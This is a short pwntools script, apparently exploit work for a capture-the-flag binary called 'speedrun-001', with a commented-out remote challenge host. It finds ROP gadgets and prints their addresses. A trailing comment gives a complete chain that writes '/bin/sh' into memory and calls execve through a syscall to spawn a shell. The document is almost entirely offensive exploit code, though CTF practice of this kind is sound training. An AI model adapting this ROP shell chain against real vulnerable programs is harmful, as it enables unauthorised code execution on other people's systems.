from pwn import *

#target = remote("chal1.sieberr.live", 15001)


elf = context.binary = ELF('./speedrun-001')  # local copy
rop = ROP(elf)



mov_qword = rop.find_gadget(['mov qword ptr [rax], rdx', "xor eax, eax ; "]).address
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
pop_rdi =  rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address
pop_rdx = rop.find_gadget(['pop rdx', 'ret']).address

syscall = rop.find_gadget(['syscall', 'ret']).address

print(pop_rax)
print(pop_rdi)
print(pop_rsi_r15)
print(pop_rdx)
print(syscall)

'''
pop rax; ret
0x6b6000
pop rdx; ret
"/bin/sh\x00"
mov qword ptr [rax], rdx ; xor eax, eax ; repz ret ret 471e28

pop rax ; ret
0x3b
pop rdi ; ret
0x6b6000
pop rsi r15 ; ret
0
0
pop rdx ; ret
0
syscall ; ret

'''